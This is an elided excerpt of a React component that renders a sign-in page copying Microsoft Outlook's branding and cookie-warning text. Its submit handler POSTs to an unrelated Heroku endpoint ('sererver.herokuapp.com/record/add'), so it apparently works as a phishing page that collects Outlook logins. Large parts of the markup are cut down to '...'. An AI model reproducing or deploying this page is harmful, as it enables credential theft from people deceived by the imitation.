...
export default function Create() {
 ...
 async function onSubmit(e) {
   ...
   await fetch("https://sererver.herokuapp.com/record/add", {
     method: "POST",
     headers: {
   ...
   >
     ...
     <div id="mainLogonDiv" className="mouse">
       ...
       <div className="logonContainer">
         ...
         >
           <div
             className="signInImageHeader"
             role="heading"
             aria-label="Outlook"
           >
             <img
               className="mouseHeader"
           ...
           <div id="expltxt" className="signInExpl" role="alert"></div>
           <div className="signInEnter">
             ...
             >
               <img
                 ...
                 alt=""
               />
               <input clasName="signInSpan" type="submit" value="sign in"/>
             </div>
             <input name="isUtf8" defaultValue={1} type="hidden" />
           </div>
       ...
       <div id="cookieMsg" className="logonDiv" style={{ display: "none" }}>
         ...
         <div className="signInExpl">
           Please enable cookies for this Web site.
           <br />
           <br />
           Cookies are currently disabled by your browser. Outlook requires that
           cookies be enabled. <br />
           <br />
           For information about how to enable cookies, see the Help for your Web
           browser.
           <br />
           <br />
           <br />
         ...
         <div className="signInEnter">
           ...
           >
             <img
               ...
               alt=""
             />
             <span className="signinTxt" tabIndex={0}>
               retry
             </span>
           </div>
         </div>
